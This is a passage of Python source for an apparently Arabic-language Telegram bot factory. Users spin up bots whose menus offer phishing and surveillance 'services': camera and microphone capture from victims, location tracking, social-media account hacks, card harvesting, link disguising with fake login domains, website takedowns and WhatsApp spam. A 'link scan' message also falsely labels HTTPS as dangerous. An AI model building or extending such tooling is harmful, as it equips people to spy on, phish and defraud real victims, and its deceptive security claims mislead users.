            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending invalid user ID message: {e}")
        except telebot.apihelper.ApiTelegramException as e:
            bot.send_message(message.chat.id, f"حدث خطأ في تيليجرام: {e}")
        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ عام: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "unmute_user")
    def unmute_user_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        try:
            bot.send_message(call.message.chat.id, "أرسل معرف المستخدم (ID) أو اسم المستخدم (@username) لإلغاء كتمه:")
            bot.register_next_step_handler(call.message, process_unmute_user)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message in unmute_user_callback: {e}")

    def process_unmute_user(message):
        try:
            user_input = message.text.strip()
            user_id = None
            if user_input.startswith('@'):
                try:
                    chat_members = bot.get_chat_administrators(message.chat.id)
                    for chat_member in chat_members:
                        if chat_member.user.username and chat_member.user.username.lower() == user_input[1:].lower():
                            user_id = chat_member.user.id
                            break
                    if user_id is None:
                        bot.send_message(message.chat.id, "لم أتمكن من العثور على المستخدم بهذا الاسم. يرجى إرسال المعرف (ID) مباشرة.")
                        return
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة جلب معلومات المستخدم: {e}. يرجى إرسال المعرف (ID) مباشرة.")
                    return
            else:
                user_id = int(user_input)

            if unmute_user(message.chat.id, user_id):
                try:
                    bot.send_message(message.chat.id, f"تم إلغاء كتم المستخدم {user_id} بنجاح.")
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error sending unmute confirmation: {e}")
            else:
                try:
                    bot.send_message(message.chat.id, "فشل في إلغاء كتم المستخدم.")
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error sending unmute failure: {e}")
        except ValueError:
            try:
                bot.send_message(message.chat.id, "معرف مستخدم غير صالح.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending invalid user ID message: {e}")
        except telebot.apihelper.ApiTelegramException as e:
            bot.send_message(message.chat.id, f"حدث خطأ في تيليجرام: {e}")
        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ عام: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "set_welcome_message")
    def set_welcome_message_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        try:
            bot.send_message(call.message.chat.id, "أرسل رسالة الترحيب الجديدة (يمكن أن تكون نصاً، صورة، أو رسالة صوتية):")
            bot.register_next_step_handler(call.message, process_set_welcome_message)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message in set_welcome_message_callback: {e}")

    def process_set_welcome_message(message):
        chat_id = message.chat.id
        # Implement welcome message logic for security bot if applicable
        try:
            bot.send_message(chat_id, "خاصية رسالة الترحيب غير مدعومة حالياً في بوت الاختراق.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending welcome message not supported: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "delete_welcome_message")
    def delete_welcome_message_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        chat_id = call.message.chat.id
        # Implement welcome message logic for security bot if applicable
        try:
            bot.send_message(chat_id, "خاصية حذف رسالة الترحيب غير مدعومة حالياً في بوت الاختراق.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending delete welcome message not supported: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "list_banned")
    def list_banned_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        try:
            bot.send_message(call.message.chat.id, "قائمة المحظورين غير متوفرة حالياً في بوت الاختراق.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending banned list not supported: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "list_muted")
    def list_muted_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        try:
            bot.send_message(call.message.chat.id, "قائمة المكتومين غير متوفرة حالياً في بوت الاختراق.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending muted list not supported: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "restart_bot")
    def restart_bot_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        try:
            bot.send_message(call.message.chat.id, "جاري إعادة تشغيل البوت...")
            # This will effectively stop the current bot's polling and allow the factory to restart it
            # Note: This will stop the current thread, the factory will restart it later.
            bot.stop_polling()
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending restart message: {e}")

    try:
        bot_username = bot.get_me().username
        print(f"✅ Protection bot @{bot_username} is running...")
        try:
            bot.delete_webhook() # Added to resolve Conflict error
            print(f"Webhook deleted for protection bot {token}")
        except Exception as e:
            print(f"Error deleting webhook for protection bot {token}: {e}")
        bot.infinity_polling(skip_pending=True)
    except telebot.apihelper.ApiTelegramException as api_e:
        print(f"Protection bot with token {token} stopped due to Telegram API error: {api_e}")
        if "Unauthorized" in str(api_e) or "Forbidden" in str(api_e):
            print(f"Possible 401 Unauthorized or 403 Forbidden error for bot {token}. Check bot token validity or bot status.")
            # يمكنك هنا إرسال إشعار للمالك إذا أردت
            # factory_bot.send_message(owner_id, f"⚠️ بوت الحماية الخاص بك توقف عن العمل (توكن غير صالح أو محظور). التوكن: {token[:5]}... يرجى التحقق منه.")
        with running_bot_threads_lock:
            if token in running_bot_threads:
                del running_bot_threads[token]
    except Exception as e:
        print(f"Protection bot with token {token} stopped due to general error: {e}")
        with running_bot_threads_lock:
            if token in running_bot_threads:
                del running_bot_threads[token]

@factory_bot.callback_query_handler(func=lambda call: call.data == "my_bots")
def show_my_bots(call):
    user_id = call.from_user.id
    all_bots = get_all_bots()
    
    user_bots = {token: data for token, data in all_bots.items() if data.get('owner_id') == user_id}

    if not user_bots:
        factory_bot.answer_callback_query(call.id, "ليس لديك أي بوتات مصنوعة.", show_alert=True)
        return

    kb = InlineKeyboardMarkup(row_width=1)
    for token_key in user_bots.keys(): # Changed variable name to avoid conflict with 'token' in outer scope
        try:
            bot_info = requests.get(f"https://api.telegram.org/bot{token_key}/getMe").json()
            if bot_info.get("ok"):
                bot_username = bot_info["result"]["username"]
                kb.add(InlineKeyboardButton(f"🤖 @{bot_username}", callback_data=f"manage_bot_{token_key}"))
            else:
                # إذا كان التوكن غير صالح، اعرض رسالة مناسبة
                error_desc = bot_info.get("description", "توكن غير صالح أو محذوف.")
                kb.add(InlineKeyboardButton(f"⚠️ بوت غير صالح ({error_desc})", callback_data=f"manage_bot_{token_key}"))
        except requests.exceptions.RequestException as req_e:
            print(f"Error fetching bot info for token {token_key} (network error): {req_e}")
            kb.add(InlineKeyboardButton(f"⚠️ خطأ في الاتصال (توكن: {token_key[:5]}...)", callback_data=f"manage_bot_{token_key}"))
        except json.JSONDecodeError as json_e:
            print(f"Error fetching bot info for token {token_key} (JSON error): {json_e}")
            kb.add(InlineKeyboardButton(f"⚠️ خطأ في البيانات (توكن: {token_key[:5]}...)", callback_data=f"manage_bot_{token_key}"))
        except Exception as e:
            print(f"General error fetching bot info for token {token_key}: {e}")
            kb.add(InlineKeyboardButton(f"⚠️ خطأ عام (توكن: {token_key[:5]}...)", callback_data=f"manage_bot_{token_key}"))

    kb.add(InlineKeyboardButton("🔙 عودة", callback_data="back_to_main"))
    
    try:
        factory_bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="اختر البوت الذي تريد إدارته من قائمتك:",
            reply_markup=kb
        )
    except telebot.apihelper.ApiTelegramException as e:
        print(f"Error editing message in show_my_bots: {e}. Sending new message instead.")
        factory_bot.send_message(
            chat_id=call.message.chat.id,
            text="اختر البوت الذي تريد إدارته من قائمتك:",
            reply_markup=kb
        )

@factory_bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
def handle_back_to_main(call):
    back_to_main_menu(call)

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("manage_bot_"))
def show_bot_management_panel(call):
    token = call.data.replace("manage_bot_", "")
    
    try:
        bot_info = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
        if not bot_info.get("ok"):
            error_desc = bot_info.get("description", "توكن غير صالح أو محذوف.")
            factory_bot.answer_callback_query(call.id, f"لا يمكن الوصول إلى هذا البوت، قد يكون التوكن غير صالح أو تم حذفه. ({error_desc})", show_alert=True)
            show_my_bots(call) # العودة إلى قائمة البوتات بعد الخطأ
            return
        bot_username = bot_info["result"]["username"]
    except requests.exceptions.RequestException as req_e:
        print(f"Network or request error in show_bot_management_panel for token {token}: {req_e}")
        factory_bot.answer_callback_query(call.id, "حدث خطأ في الاتصال بخوادم تيليجرام أثناء جلب معلومات البوت.", show_alert=True)
        return
    except json.JSONDecodeError as json_e:
        print(f"JSON decode error in show_bot_management_panel for token {token}: {json_e}")
        factory_bot.answer_callback_query(call.id, "حدث خطأ في تحليل استجابة تيليجرام أثناء جلب معلومات البوت.", show_alert=True)
        return
    except Exception as e:
        print(f"General error in show_bot_management_panel for token {token}: {e}")
        factory_bot.answer_callback_query(call.id, "حدث خطأ غير متوقع أثناء جلب معلومات البوت.", show_alert=True)
        return

    bot_data_dir = os.path.join(BOTS_DATA_DIR, token.replace(":", "_"))
    users_file = os.path.join(bot_data_dir, "users.txt")
    user_count = 0
    if os.path.exists(users_file):
        try:
            with open(users_file, 'r') as f:
                user_count = len(f.readlines())
        except Exception as e:
            print(f"Could not read users file for {token}: {e}")

    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(f"👥 المستخدمون ({user_count})", callback_data=f"bot_users_{token}"))
    kb.add(InlineKeyboardButton("❌ حذف البوت", callback_data=f"confirm_delete_{token}"))
    kb.add(InlineKeyboardButton("🔙 العودة إلى قائمة بوتاتك", callback_data="my_bots"))

    panel_text = f"لوحة التحكم الخاصة بالبوت 🤖 @{bot_username}\n\nاختر الإجراء الذي تريده:"
    
    try:
        factory_bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=panel_text,
            reply_markup=kb
        )
    except telebot.apihelper.ApiTelegramException as e:
        print(f"Error editing message in show_bot_management_panel: {e}. Sending new message instead.")
        factory_bot.send_message(
            chat_id=call.message.chat.id,
            text=panel_text,
            reply_markup=kb
        )

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("bot_users_"))
def show_bot_users(call):
    factory_bot.answer_callback_query(call.id, "هذه الميزة (عرض تفاصيل المستخدمين) قيد التطوير.", show_alert=True)

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_delete_"))
def confirm_delete_bot(call):
    token = call.data.replace("confirm_delete_", "")
    
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("✅ نعم، احذف", callback_data=f"delete_bot_{token}"),
        InlineKeyboardButton("❌ لا، تراجع", callback_data=f"manage_bot_{token}")
    )

    warning_text = "⚠️ هل أنت متأكد من أنك تريد حذف هذا البوت؟\n\nسيتم إيقاف تشغيله وحذفه نهائياً من سجلات المصنع. هذا الإجراء لا يمكن التراجع عنه."
    
    try:
        factory_bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=warning_text,
            reply_markup=kb
        )
    except telebot.apihelper.ApiTelegramException as e:
        print(f"Error editing message in confirm_delete_bot: {e}. Sending new message instead.")
        factory_bot.send_message(
            chat_id=call.message.chat.id,
            text=warning_text,
            reply_markup=kb
        )

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("delete_bot_"))
def delete_bot_permanently(call):
    token = call.data.replace("delete_bot_", "")
    
    if unregister_bot(token):
        factory_bot.answer_callback_query(call.id, "✅ تم حذف البوت بنجاح.", show_alert=True)
        show_my_bots(call)
    else:
        factory_bot.answer_callback_query(call.id, "❌ خطأ: لم يتم العثور على البوت. ربما تم حذفه بالفعل.", show_alert=True)
        show_my_bots(call)

# ==============================================================================
# --- بداية منطق البوت المصنوع (الاندكسات) ---
# ==============================================================================
def run_new_bot(token, owner_id, data_dir):
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # --- إعدادات ملفات البوت المصنوع ---
    subscribers_file = os.path.join(data_dir, "users.txt")
    admins_file = os.path.join(data_dir, "admins.txt")
    channels_file = os.path.join(data_dir, "channels.txt")
    banned_file = os.path.join(data_dir, "banned.txt")
    status_file = os.path.join(data_dir, "status.txt")
    notify_file = os.path.join(data_dir, "notify.txt")
    state_file = os.path.join(data_dir, "state.json")
    paid_mode_file = os.path.join(data_dir, "paid_mode.txt")
    paid_users_file = os.path.join(data_dir, "paid_users.txt")
    start_message_file = os.path.join(data_dir, "start_message.txt")
    points_file = os.path.join(data_dir, "points.json")
    invited_by_file = os.path.join(data_dir, "invited_by.json")
    payment_methods_file = os.path.join(data_dir, "payment_methods.json")
    stars_config_file = os.path.join(data_dir, "stars_config.json")
    custom_buttons_file = os.path.join(data_dir, "custom_buttons.json")
    hidden_buttons_file = os.path.join(data_dir, "hidden_buttons.json")
    language_file = os.path.join(data_dir, "language.txt")

    # --- دوال مساعدة لإدارة الملفات ---
    def get_json_data(file_path):
        try:
            if not os.path.exists(file_path):
                with open(file_path, 'w', encoding='utf-8') as f: json.dump({}, f)
                return {}
            with open(file_path, 'r', encoding='utf-8') as f: return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError): return {}
        
    def save_json_data(file_path, data):
        with open(file_path, 'w', encoding='utf-8') as f: json.dump(data, f, indent=4, ensure_ascii=False)
        
    def get_lines(file_path):
        try:
            if not os.path.exists(file_path): return []
            with open(file_path, 'r', encoding='utf-8') as f: return [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError: return []
        
    def add_line(file_path, line):
        current_lines = get_lines(file_path)
        if str(line) not in current_lines:
            with open(file_path, 'a', encoding='utf-8') as f: f.write(f"{line}\n")
            
    def remove_line(file_path, line_to_remove):
        lines = get_lines(file_path)
        with open(file_path, 'w', encoding='utf-8') as f:
            for line in lines:
                if line != str(line_to_remove): f.write(f"{line}\n")
                
    def get_setting(file_path, default):
        try:
            with open(file_path, 'r', encoding='utf-8') as f: return f.read().strip()
        except FileNotFoundError: return default
        
    def set_setting(file_path, value):
        with open(file_path, 'w', encoding='utf-8') as f: f.write(str(value))
        
    def get_state(user_id):
        states = get_json_data(state_file)
        return states.get(str(user_id))
        
    def set_state(user_id, state):
        states = get_json_data(state_file)
        if state is None:
            if str(user_id) in states:
                del states[str(user_id)]
        else:
            states[str(user_id)] = state
        save_json_data(state_file, states)
        
    def has_premium_features():
        premium_file = os.path.join(PREMIUM_FEATURES_DIR, f"{token}.txt")
        return os.path.exists(premium_file)

    # --- إعدادات أولية للبوت المصنوع ---
    if not os.path.exists(admins_file): add_line(admins_file, owner_id)
    if not os.path.exists(status_file): set_setting(status_file, "ON")
    if not os.path.exists(notify_file): set_setting(notify_file, "ON")
    if not os.path.exists(paid_mode_file): set_setting(paid_mode_file, "OFF")
    if not os.path.exists(stars_config_file): save_json_data(stars_config_file, {})
    if not os.path.exists(custom_buttons_file): save_json_data(custom_buttons_file, {})
    if not os.path.exists(hidden_buttons_file): save_json_data(hidden_buttons_file, [])
    if not os.path.exists(language_file): set_setting(language_file, "ar")

    # --- دوال التحقق من الحالة ---
    def is_admin(user_id): return str(user_id) in get_lines(admins_file)
    def is_paid_user(user_id): return str(user_id) in get_lines(paid_users_file)
    def is_paid_mode(): return get_setting(paid_mode_file, "OFF") == "ON"
    def is_bot_enabled(): return get_setting(status_file, "ON") == "ON"
    def is_user_banned(user_id): return str(user_id) in get_lines(banned_file)
    def is_bot_paid_to_factory():
        paid_file = os.path.join(PAID_BOTS_DIR, f"{token}.txt")
        if not os.path.exists(paid_file): return False
        try:
            expire_timestamp = float(open(paid_file).read().strip())
            return datetime.datetime.now().timestamp() < expire_timestamp
        except (ValueError, TypeError): return False
    def is_user_subscribed(user_id):
        bot_specific_channels = get_lines(channels_file)
        if not bot_specific_channels: return True, []
        not_subscribed_bot_channels = []
        for ch in bot_specific_channels:
            try:
                member = bot.get_chat_member(f"@{ch}", user_id)
                if member.status not in ['member', 'administrator', 'creator']:
                    not_subscribed_bot_channels.append(ch)
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error checking subscription for channel {ch}: {e}")
                not_subscribed_bot_channels.append(ch) # Treat API error as not subscribed for safety
        if not_subscribed_bot_channels: return False, not_subscribed_bot_channels
        return True, []

    # Function to check subscription to factory channel
    def check_factory_subscription(user_id):
        if is_bot_paid_to_factory(): # Bypass check if bot is paid
            return True
        try:
            # Use factory_bot to check subscription in the factory's channel
            member = factory_bot.get_chat_member(f"@{FACTORY_SUB_CHANNEL}", user_id)
            return member.status in ['member', 'administrator', 'creator']
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Factory sub check error for index bot: {e}")
            return False

    # --- نظام اللغات المتكامل (النسخة النهائية والمحدثة) ---
    def get_locale(lang_code=None):
        if lang_code is None:
            lang_code = get_setting(language_file, "ar")

        locales = {
            "ar": {
                # --- نصوص لوحة التحكم ---
                "welcome_panel": "مرحباً بك! إليك لوحة التحكم الخاصة بك:",
                "subscribers_count": "👥 المشتركين ({})",
                "broadcast_button": "📮 إذاعة رسالة",
                "forward_button": "🔄 توجيه رسالة",
                "add_channel_button": "💢 إضافة قناة",
                "delete_channel_button": "🔱 حذف قناة",
                "notify_on_button": "✔️ تفعيل التنبيه",
                "notify_off_button": "❎ تعطيل التنبيه",
                "bot_on_button": "✅ فتح البوت",
                "bot_off_button": "❌ إيقاف البوت",
                "ban_button": "🚫 حظر عضو",
                "unban_button": "🔓 إلغاء حظر",
                "add_admin_button": "➕ إضافة أدمن",
                "rem_admin_button": "➖ طرد أدمن",
                "paid_mode_button": "💰 الوضع المدفوع",
                "free_mode_button": "🆓 الوضع المجاني",
                "add_paid_button": "⭐ إضافة عضوية مدفوعة",
                "rem_paid_button": "🗑️ حذف عضوية مدفوعة",
                "set_stars_button": "🌟 تعيين عدد النجوم",
                "manage_payment_button": "💳 إدارة الدفع",
                "buttons_section_button": "🎛️ قسم الأزرار",
                "change_language_button": "🌍 تغيير اللغة",
                "edit_start_msg_button": "✏️ تعديل رسالة /start",
                "download_data_button": "📥 تحميل بيانات البوت",
                # --- نصوص المستخدم العام ---
                "welcome_user": "🤖✨ مرحباً بك في بوت الخدمات.",
                "must_subscribe": "🚫 يجب عليك الاشتراك في القنوات التالية للمتابعة:",
                "subscribed_button": "✅ تم الاشتراك",
                "contact_developer_button": "التواصل مع المطور 👨‍💻",
                "bot_under_maintenance": "🚨 البوت متوقف حالياً للصيانة.",
                "user_banned": "🚫 أنت محظور من استخدام هذا البوت.",
                # --- نصوص الأزرار الرئيسية ---
                "cam_back_btn": "اختراق الكاميرا الخلفية 📸", "cam_front_btn": "اختراق الكاميرا الأمامية 🔥",
                "mic_record_btn": "تسجيل صوت الضحية 🎤", "location_btn": "اختراق الموقع 📍",
                "record_video_btn": "تصوير الضحية فيديو 📹", "surveillance_cams_btn": "اختراق كاميرات المراقبة 📡",
                "insta_hack_btn": "اختراق انستجرام 🎁", "whatsapp_hack_btn": "اختراق واتساب 🟢",
                "pubg_hack_btn": "اختراق ببجي 🎮", "facebook_hack_btn": "اختراق فيسبوك 🌐",
                "tiktok_hack_btn": "اختراق تيك توك 🎵", "ff_hack_btn": "اختراق فري فاير 💎",
                "discord_hack_btn": "اختراق الديسكور🔥", "roblox_hack_btn": "اختراق روبلوكس🎮",
                "ask_wormgpt_btn": "الذكاء الاصطناعي 🤖", "snapchat_hack_btn": "اختراق سناب شات ⭐",
                "interpret_dream_btn": "تفسير الأحلام 🛌", "device_info_btn": "جمع معلومات الجهاز 📲",
                "akinator_fake_error_btn": "لعبة المارد الأزرق 🧞", "ddos_webapp_btn": "إغلاق المواقع 💣",
                "intelligence_game_btn": "لعبة الذكاء 🧠", "high_quality_shot_btn": "تصوير بدقة عالية 🖼️",
                "fake_gmail_btn": "إنشاء جميل وهمي🎫", "get_visa_btn": "صيد فيزات 💳",
                "fake_number_btn": "أرقام وهمية ☎️", "get_victim_number_btn": "معرفة رقم الضحية 📲",
                "check_link_btn": "فحص الروابط 🔭", "hack_wifi_btn": "اختراق الانترنت 🔋",
                "radio_menu_btn": "اختراق بث الراديو 📻", "zakhrafa_btn": "زخرفة الأسماء ✒️",
                "text_to_speech_btn": "تحويل النص إلى صوت 🔊", "hunt_usernames_btn": "صيد يوزرات تليجرام 🎣",
                "booming_link_start_btn": "تلغيم الروابط ☠️", "full_hack_info_btn": "اختراق الجهاز بالكامل 📵",
                "hide_link_btn": "إخفاء الرابط🔒", "whatsapp_spam_btn": "اسبام واتساب❄",
                # --- نصوص تفاعلية ---
                "back_button": "🔙 العودة",
                "cancel_button": "🔙 إلغاء",
                "action_cancelled": "✅ تم إلغاء الإجراء.",
                "language_changed": "✅ تم تغيير لغة البوت بنجاح.",
                "choose_language": "🌍 يرجى اختيار اللغة الجديدة للبوت:",
                "set_start_msg_prompt": "أرسل الآن رسالة الترحيب الجديدة.",
                "link_generated": "✅ تم توليد الرابط بنجاح",
                "copy_and_send_link": "انسخ الرابط التالي وأرسله للضحية:\n{}",
                "ask_wormgpt_prompt": "🤖 أرسل سؤالك الآن لـ WormGPT.",
                "interpret_dream_prompt": "🛌 أرسل حلمك الآن ليتم تفسيره.",
                "check_link_prompt": "🔭 أرسل الآن الرابط الذي تريد فحصه.",
                "text_to_speech_prompt": "أرسل الآن النص الذي تريد تحويله إلى بصمة صوتية.",
                "booming_link_prompt": "☠️ قم بإرسال الرابط المراد تلغيمه...",
                "hide_link_prompt": "🔒 الرجاء إدخال الرابط الأصلي الذي تريد إخفاءه:",
                "whatsapp_spam_prompt": "❄️ أرسل رقم واتساب الضحية مع رمز الدولة (مثال: 201001234567):",
                "action_success": "✅ تم تنفيذ الإجراء بنجاح.",
                "ask_channel_id": "أرسل معرف القناة بدون @",
                "ask_ban_id": "أرسل آي دي العضو الذي تريد حظره",
                "ask_unban_id": "أرسل آي دي العضو لإلغاء حظره",
                "ask_add_admin_id": "أرسل آي دي المستخدم للترقية",
                "ask_rem_admin_id": "أرسل آي دي الأدمن للعزل",
                "ask_add_paid_id": "أرسل آي دي العضو للإضافة للعضوية المدفوعة",
                "ask_rem_paid_id": "أرسل آي دي العضو للحذف من العضوية المدفوعة",
                "ask_broadcast_msg": "حسناً، أرسل رسالتك ليتم بثها لجميع المشتركين 📮",
                "ask_forward_msg": "حسناً، قم بتوجيه الرسالة لي الآن 🔄",
                "original_link_saved": "✅ تم حفظ الرابط الأصلي.\n\nأدخل الآن النطاق المخصص (مثال: instagram.com):",
                "invalid_original_link": "❌ الرابط الأصلي غير صالح. يجب أن يبدأ بـ http:// أو https://",
                "domain_saved": "✅ تم حفظ النطاق.\n\nأدخل الآن الكلمات الرئيسية (مثال: -login-now):",
                "invalid_domain": "❌ صيغة النطاق المخصص غير صحيحة. أرسل نطاقاً صالحاً (مثل: example.com).",
                "disguised_links_header": "[~] الروابط المقنعة:\n",
                "original_link_display": "الرابط الأصلي: {}\n\n",
                "invalid_phone_number": "❌ رقم الهاتف غير صالح. يرجى إرسال رقم صحيح مع رمز الدولة.",
                "sending_spam": "⏳ جاري إرسال رسالة الاسبام...",
                "spam_sent_success": "✅ تم إرسال رسالة الاسبام بنجاح!",
                "link_secure": "✅ آمن.\nيبدو أن هذا الرابط يستخدم بروتوكول HTTP القياسي.",
                "link_insecure": "🚨 خطر!\nتم اكتشاف أن هذا الرابط قد يكون ضاراً لأنه يستخدم بروتوكول HTTPS المشفر.",
                "link_unknown": "⚠️ لا يمكن تحديد حالة الرابط. يرجى إرسال رابط يبدأ بـ http أو https.",
                "tts_processing": "⏳ جاري تحويل النص إلى بصمة صوتية...",
                "tts_error": "❌ حدث خطأ أثناء التحويل. يرجى المحاولة مرة أخرى لاحقاً.",
                "service_busy": "❌ عذرًا، الخدمة مشغولة حاليًا. يرجى المحاولة مرة أخرى لاحقاً.",
                "zakhrafa_done": "تمت الزخرفة:\n\n{}",
                "choose_zakhrafa_lang": "اختر لغة النص للزخرفة:",
                "ask_zakhrafa_text": "أرسل الآن النص بـ{} ليتم زخرفته.",
                "lang_ar": "العربية",
                "lang_en": "الإنجليزية",
                # --- نصوص ميزة تحميل البيانات (جديد) ---
                "download_data_header": "📥 اختر البيانات التي تريد تحميلها:",
                "download_users_button": "👥 المستخدمين",
                "download_admins_button": "👑 المشرفين",
                "download_banned_button": "🚫 المحظورين",
                "download_channels_button": "📢 قنوات الاشتراك",
                "download_paid_users_button": "⭐ المستخدمين المدفوعين",
                "file_not_found": "⚠️ لم يتم العثور على الملف أو أنه فارغ.",
            },
            "en": {
                # --- Admin Panel Texts ---
                "welcome_panel": "Welcome! Here is your control panel:",
                "subscribers_count": "👥 Subscribers ({})",
                "broadcast_button": "📮 Broadcast Message",
                "forward_button": "🔄 Forward Message",
                "add_channel_button": "💢 Add Channel",
                "delete_channel_button": "🔱 Delete Channel",
                "notify_on_button": "✔️ Enable Notifications",
                "notify_off_button": "❎ Disable Notifications",
                "bot_on_button": "✅ Enable Bot",
                "bot_off_button": "❌ Disable Bot",
                "ban_button": "🚫 Ban User",
                "unban_button": "🔓 Unban User",
                "add_admin_button": "➕ Add Admin",
                "rem_admin_button": "➖ Remove Admin",
                "paid_mode_button": "💰 Paid Mode",
                "free_mode_button": "🆓 Free Mode",
                "add_paid_button": "⭐ Add Paid Member",
                "rem_paid_button": "🗑️ Remove Paid Member",
                "set_stars_button": "🌟 Set Stars Price",
                "manage_payment_button": "💳 Manage Payments",
                "buttons_section_button": "🎛️ Buttons Section",
                "change_language_button": "🌍 Change Language",
                "edit_start_msg_button": "✏️ Edit /start Message",
                "download_data_button": "📥 Download Bot Data",
                # --- General User Texts ---
                "welcome_user": "🤖✨ Welcome to the services bot.",
                "must_subscribe": "🚫 You must subscribe to the following channels to continue:",
                "subscribed_button": "✅ Subscribed",
                "contact_developer_button": "Contact Developer 👨‍💻",
                "bot_under_maintenance": "🚨 The bot is currently under maintenance.",
                "user_banned": "🚫 You are banned from using this bot.",
                # --- Main Buttons Texts ---
                "cam_back_btn": "Hack Rear Camera 📸", "cam_front_btn": "Hack Front Camera 🔥",
                "mic_record_btn": "Record Victim's Audio 🎤", "location_btn": "Hack Location 📍",
                "record_video_btn": "Record Victim Video 📹", "surveillance_cams_btn": "Hack Surveillance Cams 📡",
                "insta_hack_btn": "Hack Instagram 🎁", "whatsapp_hack_btn": "Hack WhatsApp 🟢",
                "pubg_hack_btn": "Hack PUBG 🎮", "facebook_hack_btn": "Hack Facebook 🌐",
                "tiktok_hack_btn": "Hack TikTok 🎵", "ff_hack_btn": "Hack Free Fire 💎",
                "discord_hack_btn": "Hack Discord 🔥", "roblox_hack_btn": "Hack Roblox 🎮",
                "ask_wormgpt_btn": "Artificial Intelligence 🤖", "snapchat_hack_btn": "Hack Snapchat ⭐",
                "interpret_dream_btn": "Dream Interpretation 🛌", "device_info_btn": "Get Device Info 📲",
                "akinator_fake_error_btn": "Akinator Game 🧞", "ddos_webapp_btn": "Shutdown Websites 💣",
                "intelligence_game_btn": "Intelligence Game 🧠", "high_quality_shot_btn": "High-Quality Shot 🖼️",
                "fake_gmail_btn": "Create Fake Gmail 🎫", "get_visa_btn": "Get VISA Cards 💳",
                "fake_number_btn": "Fake Numbers ☎️", "get_victim_number_btn": "Get Victim's Number 📲",
                "check_link_btn": "Scan Links 🔭", "hack_wifi_btn": "Hack Wi-Fi 🔋",
                "radio_menu_btn": "Hack Radio Broadcast 📻", "zakhrafa_btn": "Decorate Names ✒️",
                "text_to_speech_btn": "Text to Speech 🔊", "hunt_usernames_btn": "Hunt Telegram Usernames 🎣",
                "booming_link_start_btn": "Weaponize Links ☠️", "full_hack_info_btn": "Full Device Hack 📵",
                "hide_link_btn": "Hide Link 🔒", "whatsapp_spam_btn": "WhatsApp Spam ❄️",
                # --- Interactive Texts ---
                "back_button": "🔙 Back",
                "cancel_button": "🔙 Cancel",
                "action_cancelled": "✅ Action has been cancelled.",
                "language_changed": "✅ Bot language has been changed successfully.",
                "choose_language": "🌍 Please choose the new language for the bot:",
                "set_start_msg_prompt": "Now, send the new welcome message.",
                "link_generated": "✅ Link generated successfully",
                "copy_and_send_link": "Copy the following link and send it to the victim:\n{}",
                "ask_wormgpt_prompt": "🤖 Send your question to WormGPT now.",
                "interpret_dream_prompt": "🛌 Send your dream now to be interpreted.",
                "check_link_prompt": "🔭 Send the link you want to scan now.",
                "text_to_speech_prompt": "Send the text you want to convert to a voice message now.",
                "booming_link_prompt": "☠️ Send the link to be weaponized...",
                "hide_link_prompt": "🔒 Please enter the original link you want to hide:",
                "whatsapp_spam_prompt": "❄️ Send the victim's WhatsApp number with country code (e.g., 15551234567):",
                "action_success": "✅ The action was executed successfully.",
                "ask_channel_id": "Send the channel ID without @",
                "ask_ban_id": "Send the ID of the user you want to ban",
                "ask_unban_id": "Send the ID of the user to unban",
                "ask_add_admin_id": "Send the user's ID to promote",
                "ask_rem_admin_id": "Send the admin's ID to demote",
                "ask_add_paid_id": "Send the user's ID to add to paid membership",
                "ask_rem_paid_id": "Send the user's ID to remove from paid membership",
                "ask_broadcast_msg": "Okay, send your message to be broadcast to all subscribers 📮",
                "ask_forward_msg": "Okay, forward the message to me now 🔄",
                "original_link_saved": "✅ Original link saved.\n\nEnter the custom domain (e.g., instagram.com):",
                "invalid_original_link": "❌ Invalid original link. It must start with http:// or https://",
                "domain_saved": "✅ Domain saved.\n\nEnter the keywords (e.g., -login-now):",
